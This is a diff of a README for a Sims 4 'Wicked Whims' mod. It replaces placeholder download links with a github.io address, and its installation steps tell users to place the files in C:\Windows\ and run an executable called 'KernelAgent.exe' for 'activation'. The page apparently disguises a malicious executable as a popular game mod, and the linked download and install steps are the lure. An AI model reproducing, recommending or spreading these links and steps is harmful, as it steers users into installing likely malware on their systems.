@@ -2,7 +2,8 @@
 
 Wicked Whims and Wonderful Whims are the most downloaded realism mods for The Sims 4. They add deep relationship systems, attraction mechanics, body cycles, and optional adult content with detailed control.
 
-[![Download Mod](https://img.shields.io/badge/Download-Wicked_&_Wonderful_Whims-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Mod](https://img.shields.io/badge/Download-Wicked_&_Wonderful_Whims-blueviolet)](https://sims4-wicked-whims-wonderful-whims-mod.github.io/.github
+)
 
 ---
 
@@ -38,7 +39,8 @@ Wicked Whims and Wonderful Whims are the most downloaded realism mods for The Si
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://sims4-wicked-whims-wonderful-whims-mod.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory *(or Mods folder for Sims)*  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required for activation and script execution)  
 4. ✅ Follow any on-screen instructions or in-game prompts  
